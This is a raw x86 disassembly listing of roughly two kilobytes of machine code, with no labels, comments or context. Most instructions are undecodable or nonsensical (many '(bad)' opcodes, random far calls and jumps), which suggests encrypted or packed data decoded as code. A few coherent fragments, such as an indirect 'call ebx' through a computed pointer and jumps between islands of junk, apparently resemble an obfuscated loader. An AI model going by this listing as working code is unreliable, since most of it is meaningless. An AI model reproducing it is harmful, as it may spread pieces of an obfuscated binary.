  41c5b6:	pop    ecx
  41c5b7:	sbb    DWORD PTR [ebp+0x67],edx
  41c5ba:	adc    al,BYTE PTR [ecx+esi*2-0x6d]
  41c5be:	shr    eax,0x3b
  41c5c1:	and    eax,0xbd63a4d3
  41c5c6:	ja     0x41c55f
  41c5c8:	jnp    0x41c590
  41c5ca:	fcmovb st,st(2)
  41c5cc:	or     eax,0x14bf1432
  41c5d1:	je     0x41c5b4
  41c5d3:	loop   0x41c5e9
  41c5d5:	xlat   BYTE PTR ds:[ebx]
  41c5d6:	(bad)  
  41c5d7:	adc    BYTE PTR [edi+0x4a04c186],ah
  41c5dd:	jno    0x41c633
  41c5df:	pop    esp
  41c5e0:	sbb    ebx,0x3f
  41c5e3:	rol    esi,0x24
  41c5e6:	test   eax,0xbb67148b
  41c5eb:	lea    edi,[esi]
  41c5ed:	clc    
  41c5ee:	repnz add ch,dl
  41c5f1:	sahf   
  41c5f2:	sbb    ah,BYTE PTR [esi]
  41c5f4:	jl     0x41c598
  41c5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5f7:	pop    edi
  41c5f8:	add    BYTE PTR gs:[edx+0x43],bl
  41c5fc:	(bad)
  41c5ff:	je     0x41c5b8
  41c601:	cmp    esi,DWORD PTR [ebx+0x5]
  41c604:	jno    0x41c5db
  41c606:	sbb    ebp,edi
  41c608:	sbb    BYTE PTR [esi+ebx*1+0x67],bh
  41c60c:	icebp  
  41c60d:	mov    bl,bl
  41c60f:	sbb    al,0xe4
  41c611:	retf   
  41c612:	outs   dx,DWORD PTR ds:[esi]
  41c614:	and    eax,0x6e7d5f83
  41c619:	shr    DWORD PTR [ecx+eiz*1+0x5ad9e10a],0x77
  41c621:	call   0x7544:0x91b64c75
  41c628:	xchg   edx,eax
  41c629:	adc    ecx,DWORD PTR [esi]
  41c62b:	out    0xe1,eax
  41c62d:	(bad)  
  41c62e:	ds xchg ebp,eax
  41c630:	fadd   QWORD PTR [ecx+0x5d]
  41c633:	jae    0x41c68d
  41c635:	int3   
  41c636:	lds    esi,FWORD PTR [ebx+0x6e]
  41c639:	call   0x2ef7:0xbfdc3c26
  41c640:	pop    ds
  41c641:	xlat   BYTE PTR ds:[ebx]
  41c642:	and    dh,BYTE PTR [ebx-0x14]
  41c645:	ss in  al,0xb2
  41c648:	inc    esi
  41c649:	(bad)
  41c64c:	or     eax,0xd765c671
  41c651:	cmp    DWORD PTR [ebx-0x46],esi
  41c654:	add    cl,bl
  41c656:	mov    edi,0x10705633
  41c65b:	sub    dl,BYTE PTR [ebx+0x156647fd]
  41c661:	test   al,0x56
  41c663:	cwde   
  41c664:	sub    dh,BYTE PTR [ebx+0x20]
  41c667:	pop    edx
  41c668:	sti    
  41c669:	iret   
  41c66a:	or     al,0xf4
  41c66c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c66d:	popf   
  41c66e:	xor    BYTE PTR [eax-0x68],bl
  41c671:	(bad)  
  41c672:	mov    cl,0x23
  41c674:	(bad)  
  41c675:	out    dx,eax
  41c676:	inc    esi
  41c677:	(bad)  
  41c678:	xchg   edx,eax
  41c679:	add    dh,BYTE PTR [edx-0x1beae126]
  41c67f:	in     al,0x58
  41c681:	pop    ecx
  41c682:	popa   
  41c683:	repnz int 0xbb
  41c686:	dec    edx
  41c687:	xor    ebx,ebx
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0xda4b773e,eax
  41c6cc:	es iret 
  41c6ce:	add    cl,dh
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c717
  41c6d7:	xchg   ebp,eax
  41c6d8:	xchg   ebp,eax
  41c6d9:	das    
  41c6da:	test   BYTE PTR [ebx+0x6e0d159c],dh
  41c6e0:	xlat   BYTE PTR ds:[ebx]
  41c6e1:	icebp  
  41c6e2:	call   0xffa:0xdc11072b
  41c6e9:	sbb    al,0x61
  41c6eb:	adc    cl,BYTE PTR [esi-0x3b]
  41c6ee:	mov    ebp,0x7c411c79
  41c6f3:	call   0xf183:0x8a618884
  41c6fa:	jne    0x41c75f
  41c6fc:	aad    0xb7
  41c6fe:	push   ecx
  41c6ff:	aad    0xde
  41c701:	cmc    
  41c702:	dec    ebp
  41c703:	or     esi,DWORD PTR [ebx+0x46755f7d]
  41c709:	pop    ebp
  41c70a:	xchg   BYTE PTR [esi+0x2d],dl
  41c70d:	sbb    BYTE PTR [edx-0x594b38a6],ch
  41c713:	ret    
  41c714:	mov    esi,0x3f7d12ff
  41c719:	xor    eax,0x86b61cf1
  41c71e:	clc    
  41c71f:	test   al,0x9e
  41c721:	(bad)  
  41c723:	mov    cl,0xe4
  41c725:	jmp    0x2e6b0778
  41c72a:	arpl   WORD PTR [esi+0x4d],di
  41c72d:	cs hlt 
  41c72f:	add    BYTE PTR [esi-0x6e3183f6],bl
  41c735:	xchg   ebx,eax
  41c736:	pop    esi
  41c737:	and    eax,0xe66c2637
  41c73c:	cmp    BYTE PTR [eax+0x4c929f5c],bl
  41c742:	retf   0x2a2d
  41c745:	mov    dh,0xd4
  41c747:	cs (bad) 
  41c749:	jno    0x41c753
  41c74b:	inc    eax
  41c74c:	out    dx,al
  41c74d:	inc    edi
  41c74e:	arpl   bp,ax
  41c750:	push   ds
  41c751:	scas   eax,DWORD PTR es:[edi]
  41c752:	xchg   dl,dl
  41c754:	(bad)  
  41c755:	adc    eax,0x24c394c1
  41c75a:	jb     0x41c7bf
  41c75c:	sub    ch,al
  41c75e:	jbe    0x41c737
  41c760:	and    ebx,DWORD PTR [ecx+0x14dd0d51]
  41c766:	mov    WORD PTR ds:0xf3907c13,es
  41c76c:	icebp  
  41c76d:	ror    DWORD PTR [eax],0x7e
  41c770:	in     eax,dx
  41c771:	adc    al,0x80
  41c773:	xor    BYTE PTR [ecx-0x5b7f3b3f],bh
  41c779:	mov    esi,0x1733448a
  41c77e:	pop    esi
  41c77f:	(bad)  
  41c780:	jae    0x41c79e
  41c782:	push   es
  41c783:	xchg   ecx,eax
  41c784:	adc    BYTE PTR [edi+0x4a9276e0],bl
  41c78a:	test   DWORD PTR [eax],edx
  41c78c:	nop
  41c78d:	adc    bl,dl
  41c78f:	pop    edi
  41c790:	push   es
  41c791:	xchg   esp,eax
  41c792:	loopne 0x41c7b7
  41c794:	je     0x41c71e
  41c796:	inc    esp
  41c797:	inc    ecx
  41c798:	gs dec ecx
  41c79a:	and    al,0x18
  41c79c:	test   eax,0x259449fe
  41c7a1:	xchg   esi,eax
  41c7a2:	push   esi
  41c7a3:	cmp    DWORD PTR [ebp+0x16],ecx
  41c7a6:	(bad)  
  41c7a8:	mov    dl,ah
  41c7aa:	pop    eax
  41c7ab:	leave  
  41c7ac:	das    
  41c7ad:	hlt    
  41c7ae:	ss pop eax
  41c7b0:	jl     0x41c7cf
  41c7b2:	sub    ah,BYTE PTR [esi+0x72]
  41c7b5:	push   eax
  41c7b6:	cmp    DWORD PTR [ecx+eiz*2],ecx
  41c7b9:	add    eax,0xc2aa86dd
  41c7be:	jmp    0xc988afb6
  41c7c3:	in     eax,0x8c
  41c7c5:	jge    0x41c7c5
  41c7c7:	or     al,0x95
  41c7c9:	out    0xb,eax
  41c7cb:	inc    esi
  41c7cc:	xchg   esp,eax
  41c7cd:	sti    
  41c7ce:	(bad)  [edx]
  41c7d0:	push   edi
  41c7d1:	dec    esi
  41c7d2:	fisttp WORD PTR cs:[esi+eiz*2-0x39cb8e3c]
  41c7da:	dec    esp
  41c7db:	ss leave 
  41c7dd:	push   ds
  41c7de:	sti    
  41c7df:	pop    ds
  41c7e0:	popf   
  41c7e1:	jge    0x41c7ff
  41c7e3:	imul   ebp,DWORD PTR [edx+0x7a8be7dc],0x61
  41c7ea:	mov    ch,0x53
  41c7ec:	fst    DWORD PTR [ecx+0x48172862]
  41c7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7f3:	aam    0xf8
  41c7f5:	gs cdq 
  41c7f7:	out    0xf0,al
  41c7f9:	inc    eax
  41c7fa:	(bad)  
  41c7fb:	jmp    edx
  41c7fd:	arpl   WORD PTR es:[edx+0x5b],di
  41c801:	(bad)  
  41c802:	xchg   ebp,eax
  41c803:	pushf  
  41c804:	cmp    cl,ch
  41c806:	(bad)  
  41c807:	fsubr  DWORD PTR [ebx+0x2d]
  41c80a:	push   es
  41c80b:	std    
  41c80c:	neg    BYTE PTR [edi-0x60300a35]
  41c812:	fdivr  st,st(3)
  41c814:	or     eax,DWORD PTR [esi-0x5b76f3d]
  41c81a:	mov    edi,0xa1644866
  41c81f:	push   ecx
  41c820:	jg     0x41c875
  41c822:	shl    DWORD PTR [ebx-0x53c0165],0x1b
  41c829:	neg    DWORD PTR [ecx-0x4bc07b76]
  41c82f:	add    ecx,edi
  41c831:	inc    ebp
  41c832:	data16 lods al,BYTE PTR ds:[esi]
  41c834:	int3   
  41c835:	or     BYTE PTR [eax+0x54],cl
  41c838:	cs sbb eax,0xffa6014d
  41c83e:	mov    al,ds:0x7196fe74
  41c843:	int    0xfd
  41c845:	inc    esi
  41c846:	sti    
  41c847:	and    esi,DWORD PTR [eax+0x3c]
  41c84a:	sbb    al,BYTE PTR [esi-0x5b]
  41c84d:	pop    ds
  41c84e:	sub    BYTE PTR [ebx],ch
  41c850:	cmc    
  41c851:	xor    ecx,DWORD PTR [esi+0x5e803880]
  41c857:	dec    eax
  41c858:	adc    BYTE PTR [ecx-0x7c],bh
  41c85b:	scas   eax,DWORD PTR es:[edi]
  41c85c:	sti    
  41c85d:	mov    ecx,0x82ed401
  41c862:	mov    DWORD PTR [ebp+eiz*2+0x30fccfdc],eax
  41c869:	mov    al,0x8e
  41c86b:	mov    cl,0xbe
  41c86d:	fsubrp st(5),st
  41c86f:	cs jnp 0x41c852
  41c872:	addr16 jmp 0xde16bd22
  41c878:	mov    dl,0x7e
  41c87a:	ss addr16 in eax,dx
  41c87d:	xchg   ebp,eax
  41c87e:	jmp    0x954ff89a
  41c883:	inc    ebp
  41c884:	pop    ebp
  41c885:	add    DWORD PTR [edi-0x6d46bbce],0xffffffb9
  41c88c:	jle    0x41c89c
  41c88e:	test   DWORD PTR [ebx],ebp
  41c890:	in     al,dx
  41c891:	or     al,0xbf
  41c893:	and    al,0x53
  41c895:	jmp    FWORD PTR [edi]
  41c897:	inc    edi
  41c898:	(bad)  
  41c899:	cmc    
  41c89a:	lock dec ebp
  41c89c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c89d:	pop    ss
  41c89e:	pushf  
  41c89f:	ret    
  41c8a0:	aam    0x6e
  41c8a2:	xor    al,0x38
  41c8a4:	fwait
  41c8a5:	stos   DWORD PTR es:[edi],eax
  41c8a6:	xchg   edi,eax
  41c8a7:	es adc ch,al
  41c8aa:	push   ds
  41c8ab:	(bad)  
  41c8ac:	pop    esp
  41c8ad:	sub    DWORD PTR ds:0xb3f8611e,ebp
  41c8b3:	dec    eax
  41c8b4:	xchg   ecx,eax
  41c8b5:	jno    0x41c8fc
  41c8b7:	cwde   
  41c8b8:	mov    ecx,0x21cec9b5
  41c8bd:	dec    esi
  41c8be:	push   ds
  41c8bf:	or     esi,DWORD PTR [ebx+edi*8+0x56]
  41c8c3:	and    al,0x19
  41c8c5:	fisubr DWORD PTR [edx+0x7d733623]
  41c8cb:	sub    edi,edx
  41c8cd:	out    0x82,al
  41c8cf:	push   cs
  41c8d0:	cmp    eax,0x8800f2e7
  41c8d5:	stos   BYTE PTR es:[edi],al
  41c8d6:	cmp    BYTE PTR [ebx+0xe26297a],bh
  41c8dc:	push   ebx
  41c8dd:	fild   DWORD PTR [ebp-0x63]
  41c8e0:	aaa    
  41c8e1:	mov    cl,0xd5
  41c8e3:	or     al,0x2c
  41c8e5:	(bad)  
  41c8e6:	outs   dx,DWORD PTR ds:[esi]
  41c8e7:	jno    0x41c8d0
  41c8e9:	and    DWORD PTR [ebx+0x4af4ca26],edx
  41c8ef:	inc    ebx
  41c8f0:	add    ebx,DWORD PTR [edx+ebx*1]
  41c8f3:	dec    ebx
  41c8f4:	xor    edx,edx
  41c8f6:	add    DWORD PTR [ebp-0xc],ebx
  41c8f9:	pop    ebx
  41c8fa:	mov    eax,DWORD PTR [ebp-0xc]
  41c8fd:	pop    edi
  41c8fe:	jmp    0x41cb33
  41c903:	rcl    al,0xd2
  41c906:	ret    
  41c907:	ror    cl,cl
  41c909:	aad    0xdb
  41c90b:	and    BYTE PTR [ecx-0x7e],0x5e
  41c90f:	(bad)  
  41c910:	test   al,0x5a
  41c912:	mov    ecx,0x787ff718
  41c917:	adc    BYTE PTR [esi+0x78],bh
  41c91a:	js     0x41c914
  41c91c:	jl     0x41c98c
  41c91e:	js     0x41c982
  41c920:	enter  0x59bc,0xcd
  41c924:	mov    DWORD PTR [ebx-0x425274f4],edx
  41c92a:	adc    al,0x17
  41c92c:	and    BYTE PTR [ebx],ch
  41c92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c92f:	stc    
  41c930:	inc    esp
  41c931:	stos   BYTE PTR es:[edi],al
  41c932:	jb     0x41c8bb
  41c934:	ret    0xd245
  41c937:	jb     0x41c92e
  41c939:	push   esi
  41c93a:	fwait
  41c93b:	cwde   
  41c93c:	scas   al,BYTE PTR es:[edi]
  41c93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c93e:	icebp  
  41c93f:	jmp    0x226d:0x4c201782
  41c946:	and    BYTE PTR [ebp+0x25],0xf4
  41c94a:	push   edi
  41c94b:	or     DWORD PTR [eax+0x12],ecx
  41c94e:	and    al,0x6f
  41c950:	inc    ecx
  41c951:	stc    
  41c952:	mov    edi,0x477649f7
  41c957:	std    
  41c958:	or     esi,edx
  41c95a:	add    al,0x3b
  41c95c:	sbb    al,0xe6
  41c95e:	aad    0xeb
  41c960:	dec    ebp
  41c961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c962:	and    edi,DWORD PTR [ebx+0xfeb656c]
  41c968:	mov    edi,DWORD PTR ds:0x83b9b644
  41c96e:	outs   dx,BYTE PTR ds:[esi]
  41c96f:	fstp   DWORD PTR [ecx-0x12832e76]
  41c975:	out    dx,al
  41c976:	ret    0xe876
  41c979:	add    DWORD PTR [edx],edi
  41c97b:	dec    ecx
  41c97c:	cmp    eax,0x4e8025bf
  41c981:	gs sbb cl,dl
  41c984:	sbb    eax,0x5ee59f2f
  41c989:	push   ecx
  41c98a:	or     DWORD PTR ds:0x7757190,esi
  41c990:	mov    ebx,0x2775d977
  41c995:	test   DWORD PTR [ecx+0xa88e05a],esi
  41c99b:	add    ebx,esp
  41c99d:	sub    al,0x60
  41c99f:	inc    edi
  41c9a0:	data16 and bl,BYTE PTR [esi]
  41c9a3:	xor    al,0xf8
  41c9a5:	mov    edx,0x1bc36038
  41c9aa:	out    dx,al
  41c9ab:	jge    0x41c960
  41c9ad:	stc    
  41c9ae:	dec    esp
  41c9af:	xchg   edi,eax
  41c9b0:	and    al,0xc4
  41c9b2:	push   0x7d
  41c9b4:	cmp    al,0x39
  41c9b6:	jno    0x41c9de
  41c9b8:	(bad)  
  41c9b9:	mov    eax,ds:0xa2866f79
  41c9be:	popa   
  41c9bf:	cs scas eax,DWORD PTR es:[edi]
  41c9c1:	mov    ebp,0x4080c2a7
  41c9c6:	arpl   dx,dx
  41c9c8:	mov    bl,0x7d
  41c9ca:	daa    
  41c9cb:	mov    ch,0x39
  41c9cd:	arpl   WORD PTR [eax+0x17b55682],sp
  41c9d3:	mov    eax,0xcd4560d4
  41c9d8:	ins    DWORD PTR es:[edi],dx
  41c9d9:	fist   WORD PTR [ebx-0x5bdb8187]
  41c9df:	cli    
  41c9e0:	cmp    DWORD PTR gs:[eax+0x71],0x4f022f10
  41c9e8:	(bad)  
  41c9e9:	xchg   ebx,eax
  41c9ea:	mov    ds:0x3290a103,al
  41c9ef:	rcr    BYTE PTR [esi],1
  41c9f1:	sbb    esp,DWORD PTR [edi]
  41c9f3:	jge    0x41c981
  41c9f5:	sub    ah,bl
  41c9f7:	pushf  
  41c9f8:	out    0x55,al
  41c9fa:	xor    ah,BYTE PTR [edi-0x27c1be3b]
  41ca00:	sub    dh,BYTE PTR [edi*2+0x14bca2cd]
  41ca07:	adc    dl,bh
  41ca09:	(bad)  
  41ca0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca0b:	aam    0x4b
  41ca0d:	xor    DWORD PTR [edi-0x43],esi
  41ca10:	ret    
  41ca11:	in     eax,0x73
  41ca13:	in     eax,dx
  41ca14:	ja     0x41ca7a
  41ca16:	fiadd  WORD PTR [eax+0x3f90de2d]
  41ca1c:	xchg   esp,eax
  41ca1d:	fidivr DWORD PTR [edi]
  41ca1f:	xchg   esp,eax
  41ca20:	push   edx
  41ca21:	es cmc 
  41ca23:	out    0x8e,al
  41ca25:	dec    eax
  41ca26:	mov    edx,0x49aabfbe
  41ca2b:	ins    DWORD PTR es:[edi],dx
  41ca2c:	xchg   esp,eax
  41ca2d:	sub    dl,ch
  41ca2f:	mov    edx,0x4a7318e5
  41ca34:	(bad)  
  41ca35:	jnp    0x41c9cb
  41ca37:	mov    ds:0x63663a21,al
  41ca3c:	jmp    0x97a6:0x90a57df
  41ca43:	push   ebp
  41ca44:	cli    
  41ca45:	ss cs sahf 
  41ca48:	je     0x41cab6
  41ca4a:	mov    ebp,0x8741075a
  41ca4f:	repnz sub ebx,DWORD PTR [edx-0xe]
  41ca53:	sbb    edi,DWORD PTR [eax]
  41ca55:	clc    
  41ca56:	cmp    esp,eax
  41ca58:	mov    dh,0x5d
  41ca5a:	ret    
  41ca5b:	inc    edx
  41ca5c:	test   BYTE PTR [edx+edx*4-0x26578495],dl
  41ca63:	dec    ebp
  41ca64:	xlat   BYTE PTR ds:[ebx]
  41ca65:	ins    BYTE PTR es:[edi],dx
  41ca66:	dec    ebp
  41ca67:	adc    DWORD PTR [eax-0x12],esi
  41ca6a:	push   es
  41ca6b:	xor    al,0xc0
  41ca6d:	dec    ebp
  41ca6e:	enter  0xf69e,0xda
  41ca72:	mov    ds:0xe88e04d5,al
  41ca77:	inc    esi
  41ca78:	xor    BYTE PTR [edx-0x4de5ee38],al
  41ca7e:	scas   eax,DWORD PTR es:[edi]
  41ca7f:	cmp    BYTE PTR [edi+0x49],0xad
  41ca83:	xchg   esi,eax
  41ca84:	fild   WORD PTR [esi-0x2e0e13cb]
  41ca8a:	imul   esp,edx,0x8
  41ca8d:	sub    al,0xc9
  41ca8f:	outs   dx,DWORD PTR ds:[esi]
  41ca90:	out    0x51,eax
  41ca92:	(bad)  
  41ca93:	js     0x41ca9f
  41ca95:	cld    
  41ca96:	(bad)  
  41ca98:	retf   
  41ca99:	pop    ecx
  41ca9a:	push   ss
  41ca9b:	je     0x41ca57
  41ca9d:	cmp    BYTE PTR [eax+ebp*2-0x7f7eace3],ch
  41caa4:	jg     0x41cac1
  41caa6:	psubw  mm4,QWORD PTR [eax+0x21]
  41caaa:	mov    eax,ds:0xdb0b007f
  41caaf:	ds xor eax,0x839b28dc
  41cab5:	pop    ss
  41cab6:	xor    cl,BYTE PTR [edx+0x123e6b76]
  41cabc:	into   
  41cabd:	add    ch,BYTE PTR [ecx-0xb]
  41cac0:	push   edi
  41cac1:	test   al,0x52
  41cac3:	mov    bl,0x2d
  41cac5:	(bad)  
  41cac6:	pop    ebx
  41cac7:	dec    esp
  41cac8:	leave  
  41cac9:	dec    edi
  41caca:	adc    al,0xfa
  41cacc:	dec    dl
  41cace:	in     eax,dx
  41cacf:	lods   al,BYTE PTR ds:[esi]
  41cad0:	pop    es
  41cad1:	adc    BYTE PTR [ebx-0x5f2cf03c],0x41
  41cad8:	ins    BYTE PTR es:[edi],dx
  41cad9:	adc    al,0x69
  41cadb:	mov    ecx,0xb0cd7c94
  41cae0:	mov    al,0x30
  41cae2:	xchg   edx,ecx
  41cae4:	push   edi
  41cae5:	inc    eax
  41cae6:	out    dx,eax
  41cae7:	push   0x65900d1a
  41caec:	sub    ebp,DWORD PTR [edi-0xf117eda]
  41caf2:	inc    edx
  41caf3:	nop
  41caf4:	bound  edi,QWORD PTR [ecx]
  41caf6:	sti    
  41caf7:	or     al,0x4
  41caf9:	out    0xba,eax
  41cafb:	xor    eax,edx
  41cafd:	cmp    al,0xdd
  41caff:	mov    ch,0x86
  41cb01:	pop    eax
  41cb02:	push   esi
  41cb03:	loope  0x41cb3a
  41cb05:	sbb    edi,DWORD PTR [eax+0x77]
  41cb08:	inc    ebx
  41cb09:	adc    ecx,eax
  41cb0b:	es mov ecx,0xab1174d0
  41cb11:	fcmovbe st,st(1)
  41cb13:	aam    0x8a
  41cb15:	pop    ecx
  41cb16:	pop    edx
  41cb17:	push   0xffffff88
  41cb19:	xchg   esp,eax
  41cb1a:	pop    ebp
  41cb1b:	push   0x3454f35b
  41cb20:	rcl    bh,0xb8
  41cb23:	inc    ecx
  41cb24:	cmc    
  41cb25:	adc    al,0x69
  41cb27:	jmp    0x85d6e479
  41cb2c:	adc    eax,0x3d9d1f5a
  41cb31:	les    esp,FWORD PTR [esi+0x5e]
  41cb34:	jmp    0x41cd69
  41cb39:	into   
  41cb3a:	iret   
  41cb3b:	into   
  41cb3c:	ror    ch,1
  41cb3e:	aad    0xd6
  41cb40:	aad    0xbe
  41cb42:	mov    esp,0x7b656037
  41cb47:	and    al,0x51
  41cb49:	xor    ch,dh
  41cb4b:	jg     0x41cbc5
  41cb4d:	adc    BYTE PTR [esi+0x78],bh
  41cb50:	js     0x41cb32
  41cb52:	fptan  
  41cb54:	(bad)  
  41cb55:	into   
  41cb56:	mov    al,ds:0x40b2f8ca
  41cb5b:	stos   DWORD PTR es:[edi],eax
  41cb5c:	mov    eax,ds:0xebadcde6
  41cb61:	sub    eax,edx
  41cb63:	sub    eax,0x9212bfb1
  41cb68:	stos   BYTE PTR es:[edi],al
  41cb69:	pop    ebp
  41cb6a:	loop   0x41cb54
  41cb6c:	in     al,0x4a
  41cb6e:	push   es
  41cb6f:	adc    edi,esi
  41cb71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb72:	and    esi,DWORD PTR [ebp-0x46839311]
  41cb78:	loopne 0x41cbf1
  41cb7a:	test   BYTE PTR [esi+0x74],0x93
  41cb7e:	sar    BYTE PTR [edx-0x9b2796d],0xf3
  41cb85:	jecxz  0x41cb8d
  41cb87:	retf   
  41cb88:	cmp    eax,0x3ed8afc3
  41cb8d:	in     eax,0x6b
  41cb8f:	ss mov bh,ah
  41cb92:	xchg   DWORD PTR [ecx-0x1c],edi
  41cb95:	push   0xffffff96
  41cb97:	adc    BYTE PTR [eax+0x17],0xcd
  41cb9b:	cmp    BYTE PTR [edi-0x22],ah
  41cb9e:	jmp    0x7e1473b7
  41cba3:	test   BYTE PTR [ebx-0x312ec3d6],al
  41cba9:	or     edi,esi
  41cbab:	test   BYTE PTR [esi],al
  41cbad:	cmp    al,0x1a
  41cbaf:	push   esi
  41cbb0:	sub    eax,0x8d3134b
  41cbb5:	mov    dl,BYTE PTR [ebx-0x6d25d472]
  41cbbb:	pop    ebp
  41cbbc:	scas   eax,DWORD PTR es:[edi]
  41cbbd:	add    al,0x4a
  41cbbf:	xchg   ecx,eax
  41cbc0:	popf   
  41cbc1:	neg    eax
  41cbc3:	mov    bl,BYTE PTR [ebp-0x66fe50c3]
  41cbc9:	pop    edx
  41cbca:	aad    0x62
  41cbcc:	out    dx,al
  41cbcd:	ss push ebp
  41cbcf:	out    dx,eax
  41cbd0:	ficom  DWORD PTR [eax-0x1e]
  41cbd3:	sbb    bh,BYTE PTR [ecx+0x6f8f1b4d]
  41cbd9:	pop    ss
  41cbda:	sbb    al,0x8b
  41cbdc:	add    dl,BYTE PTR [ecx+0x760f79e6]
  41cbe2:	mov    ds:0xa0b1ed30,al
  41cbe7:	icebp  
  41cbe8:	push   es
  41cbe9:	cdq    
  41cbea:	(bad)  
  41cbeb:	xor    eax,ebx
  41cbed:	les    edi,FWORD PTR [esi+eiz*1]
  41cbf0:	call   0xb5d6c747
  41cbf5:	fmul   DWORD PTR [edx-0x39]
  41cbf8:	fcomp  st(4)
  41cbfa:	or     DWORD PTR [ebp-0x72],eax
  41cbfd:	jl     0x41cbeb
  41cbff:	jecxz  0x41cc50
  41cc01:	popf   
  41cc02:	inc    ebx
  41cc03:	cmp    DWORD PTR [eax],edi
  41cc05:	aas    
  41cc06:	and    BYTE PTR [edi+eax*1+0x44],bl
  41cc0a:	mov    eax,ds:0x4603900c
  41cc0f:	gs (bad) 
  41cc11:	stc    
  41cc12:	xor    BYTE PTR [ecx+0x662bf6de],bh
  41cc18:	jbe    0x41cbd5
  41cc1a:	xchg   edi,eax
  41cc1b:	ds inc ecx
  41cc1d:	dec    esp
  41cc1e:	int    0x4f
  41cc20:	and    BYTE PTR [ebx-0x5f],bh
  41cc23:	pop    ebx
  41cc24:	and    DWORD PTR [edx-0x5d],edx
  41cc27:	inc    eax
  41cc28:	push   ss
  41cc29:	fadd   st(3),st
  41cc2b:	imul   esp,eax,0x210019ea
  41cc31:	sti    
  41cc32:	(bad)  
  41cc33:	(bad)  
  41cc35:	or     edx,DWORD PTR [eax]
  41cc37:	and    al,0x8
  41cc39:	inc    esi
  41cc3a:	jmp    0xb1899ec
  41cc3f:	xor    al,0xf2
  41cc41:	and    eax,0x4eb2b7de
  41cc46:	out    dx,al
  41cc47:	bound  edx,QWORD PTR [ecx+0x8c836ce]
  41cc4d:	adc    al,BYTE PTR [ebx]
  41cc4f:	rcr    DWORD PTR ds:0x40ea1ba6,cl
  41cc55:	add    al,0x85
  41cc57:	sub    ebp,DWORD PTR [ebp-0x54ba107d]
  41cc5d:	pop    ebx
  41cc5e:	mov    ecx,0xb6dc9951
  41cc63:	inc    edi
  41cc64:	mov    ah,0xd8
  41cc66:	pop    es
  41cc67:	sar    BYTE PTR [esi+0x7c830539],0x4f
  41cc6e:	sbb    ch,BYTE PTR [ecx]
  41cc70:	popf   
  41cc71:	test   al,0x92
  41cc73:	mov    BYTE PTR [edx],ch
  41cc75:	inc    edx
  41cc76:	(bad)  
  41cc77:	aad    0xc5
  41cc79:	stc    
  41cc7a:	stos   DWORD PTR es:[edi],eax
  41cc7b:	jne    0x41cc87
  41cc7d:	push   ecx
  41cc7e:	push   edi
  41cc7f:	stos   BYTE PTR es:[edi],al
  41cc80:	lea    edx,[edi+esi*4]
  41cc83:	stos   DWORD PTR es:[edi],eax
  41cc84:	push   ebp
  41cc85:	pop    esp
  41cc86:	dec    edi
  41cc87:	xchg   BYTE PTR [ebx-0x17],dl
  41cc8a:	push   0x7
  41cc8c:	jbe    0x41ccbb
  41cc8e:	mov    al,0x45
  41cc90:	enter  0x2b05,0x46
  41cc94:	mov    ds:0x979a6a84,eax
  41cc99:	fimul  WORD PTR [eax+0x31]
  41cc9c:	jmp    0xae01:0x15078a0d
  41cca3:	lds    esi,FWORD PTR [ebp+0x28]
  41cca6:	push   ecx
  41cca7:	hlt    
  41cca8:	call   0xadc2d645
  41ccad:	or     DWORD PTR [ebx],esi
  41ccaf:	je     0x41cd23
  41ccb1:	sub    edx,DWORD PTR [bp+si-0x4]
  41ccb5:	adc    eax,edx
  41ccb7:	rcr    ebp,cl
  41ccb9:	push   es
  41ccba:	sar    DWORD PTR [ecx+0x66cd95f3],1
  41ccc0:	popa   
  41ccc1:	fcomp  DWORD PTR [edi]
  41ccc3:	femms  
  41ccc5:	jo     0x41cc54
  41ccc7:	jg     0x41cd0c
  41ccc9:	fwait
  41ccca:	jmp    0x1467c4c
  41cccf:	jp     0x41cd11
  41ccd1:	outs   dx,BYTE PTR ds:[esi]
  41ccd2:	xchg   edi,eax
  41ccd3:	dec    ebp
  41ccd4:	dec    ebp
  41ccd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccd6:	xlat   BYTE PTR ds:[ebx]
  41ccd7:	sub    al,BYTE PTR ds:0x61523440
  41ccdd:	cmp    dl,BYTE PTR ds:0x9a12c5b8
  41cce3:	retf   0x7cd4
  41cce6:	jl     0x41ccef
  41cce8:	push   ss
  41cce9:	popf   
  41ccea:	repz jmp 0x41cce6
  41cced:	ds stos DWORD PTR es:[edi],eax
  41ccef:	ret    0xb6cd
  41ccf2:	mov    eax,ds:0xfdc087e8
  41ccf7:	sub    BYTE PTR [edi+0x7c],dh
  41ccfa:	in     al,dx
  41ccfb:	in     al,dx
  41ccfc:	mov    bh,0xd0
  41ccfe:	pop    edi
  41ccff:	repnz (bad) 
  41cd01:	ins    BYTE PTR es:[edi],dx
  41cd02:	and    al,0x1c
  41cd04:	and    al,0xa3
  41cd06:	xchg   ebp,ebx
  41cd08:	push   ds
